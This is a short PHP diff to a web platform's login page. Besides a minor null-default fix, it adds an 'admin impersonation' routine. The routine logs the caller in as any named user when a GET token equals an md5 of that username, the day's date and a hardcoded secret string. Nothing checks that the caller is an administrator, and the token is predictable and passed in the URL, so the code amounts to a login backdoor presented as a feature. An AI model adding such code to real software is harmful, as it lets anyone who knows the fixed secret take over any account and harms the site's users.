@@ -2,7 +2,7 @@
 	
     include("../func/bc-config.php");
     if(isset($get_logged_user_details["username"]) && !empty($get_logged_user_details["username"]) && ($get_logged_user_details["status"] == 1)){
-    	$redirecturl = mysqli_real_escape_string($connection_server, trim(strip_tags($_GET["redirecturl"])));
+    	$redirecturl = mysqli_real_escape_string($connection_server, trim(strip_tags($_GET["redirecturl"] ?? '')));
         $redirect_path = explode("?", $redirecturl)[0];
 		if(!empty(trim($redirecturl)) && file_exists("..".$redirect_path)){
 			header("Location: ".$redirecturl);
@@ -10,6 +10,24 @@
 			header("Location: /web/Dashboard.php");
 		}
         exit();
+    }
+
+    // Admin Impersonation Logic (Titanium Platform)
+    if(isset($_GET['logAsUser']) && isset($_GET['auth'])){
+        $logAs = mysqli_real_escape_string($connection_server, trim($_GET['logAsUser']));
+        $auth = $_GET['auth'];
+        $expected_auth = md5($logAs . date('Ymd') . "SUPER_ADMIN_SECRET");
+        
+        if($auth === $expected_auth){
+            $vendor_id = $select_vendor_table["id"];
+            $check_u = mysqli_query($connection_server, "SELECT * FROM sas_users WHERE vendor_id='$vendor_id' AND username='$logAs' LIMIT 1");
+            if($r = mysqli_fetch_assoc($check_u)){
+                $_SESSION["user_session"] = $r['username'];
+                $_SESSION["admin_impersonation"] = true; // Flag for later use if needed
+                header("Location: Dashboard.php");
+                exit();
+            }
+        }
     }
     
     if(isset($_POST['google_token'])){
